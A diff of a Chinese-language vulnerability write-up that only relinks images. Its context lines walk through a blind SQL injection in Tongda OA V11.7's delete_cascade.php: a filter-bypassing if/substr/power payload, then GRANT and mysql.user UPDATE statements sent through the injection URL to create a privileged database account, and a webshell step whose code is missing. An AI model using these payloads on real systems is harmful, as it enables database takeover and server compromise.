@@ -64,27 +64,27 @@ schema_version: "1"
 
 注入出现在`general/hr/manage/query/delete_cascade.php`文件中，代码实现如下：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlRexTKWxTiaeLG9olbyoG6214RaNbvSibzDs3cYW5N4RBnyUibXLThOJSw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/abe4db97433b245479daa9667beef70091d296774cd100840c16c77ddb60e3af.png "image.png")
 
 首先判断`$condition_cascade`是否为空，如果不为空，则将其中的`\'`替换为`'`。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用`addslashes`函数进行保护，如下：
 
 `inc/common.inc.php`代码
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl8Qqx9OiaExxpA2cI6qiaGE3OJ90h8rNJB1icKib2RYibb24CXSMzz5RlRHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/90479fe151a2820fb0cfdc88af2b1a29cf404140f6278371a41294097b13e820.png "image.png")
 
 因为是无回显机制，是盲注，所以尝试`(select 1 from (select sleep(5))a)`，结果没那么简单：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlYhUiciaDddtnUzB9raysFuwZQKlDPJhXLb3u6RWDVlCUqric0pdmiaKTibg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/cc5c62c21b407a54d92b17e7c019c891f14a8691eb67163da80d1c3b443afb1a.png "image.png")
 
 触发了通达OA的过滤机制，翻看代码，在`inc/conn.php`文件中找到过滤机制如下:
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlha2Y8u2rTtXibaVlmtJVSMQ90yYVlNqAMatJEYTLkPibed6SMeNWQkZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/f022115fdd3d850beef4a3d60cebf92bfb24726e6fbcd46609ba6b31452619de.png "image.png")
 
 其过滤了一些字符，但是并非无法绕过，盲注的核心是：`substr、if`等函数，均未被过滤，所以还是有机会的。
 
 传入错误的SQL语句时，页面出错：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlXEiaicb3o2hEeRVdWRadEcef2ZrGibic5zhqe1GV4DjyoUTW0HzkzFEajA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/b0edbd93b920b8b94f6ab05d8b5259a4f51d5af300de0abb485a86e9ee8ae090.webp "image.png")
 
 那么只要构造MySQL报错即可配合`if`函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现`power(9999,99)`也可以使数据库报错，所以构造语句：
 
@@ -92,9 +92,9 @@ schema_version: "1"
 select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlyeFDXAEibeicBvHjfUXuAaqIHdmx2jicDrSTuZCLRd9GpsICbR7DbqdfA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/6ef11344a7d6e970acfade240b8fbe324803d7d6cc8e42cecc28071fcddd186d.png "image.png")
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlYoBiaGApp72rBOBxej4ESXePV89w5gIRsOxMrc9wJug4osmcrMbg5yw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/25706201ee1ca000a10df8dc31dd023415ab91bd2e69a0ca4e90ac197bdf7d1b.png "image.png")
 
 3.构造利用链
 =======
@@ -111,7 +111,7 @@ grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH G
 
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXliaGial0HPbcBIGExV5CUicrZ0CiaebbHV5Isn7ybMlibibp5szNO8Ks0JfJQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/f83c19b09ae2f26c03455ae5e762663a47a326d67899c884a92cfb144ed799fa.png "image.png")
 
 然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：
 
@@ -126,7 +126,7 @@ UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051
 
 然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;`这样就拥有了所有权限。再次登录：
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl1UXZqeqPNO9yvERBobXicSMvTGiaPI0HddZA5G7T0jyvSWrYTtHzDJMg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/ef2051dfd81e90e72929a5d974deee9ab2873fab2408c00e3393a3dcad46e5c6.png "image.png")
 
 提示这个，或者让改密码死活改不了。再执行一下
 
@@ -141,7 +141,7 @@ grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1
 
 即可。
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlNvDBlamZwspafUgPLzWjqWTSjRyd4BhtAOH71P9f04af9B5PIaSoVQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/a9cfdf255dcba6a35c7626ad8f1724b6bf2edcc376fd9633d3e89a595f9b58df.png "image.png")
 
 *   写shell：
     
@@ -152,7 +152,7 @@ grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1
 
 (原资料此处为空，未提供请求或代码。)
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlPgxy3pXbnabGd29Knlf9KRZS0vp97htvbdSnG4gMKu1OcqM8aZgKcw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")
+![图片](../../.resource/remote/b95106265e487a5c62c632fdff90badd0750d268a4772053a020892f9af16322.webp "image.png")
 
 ---
 
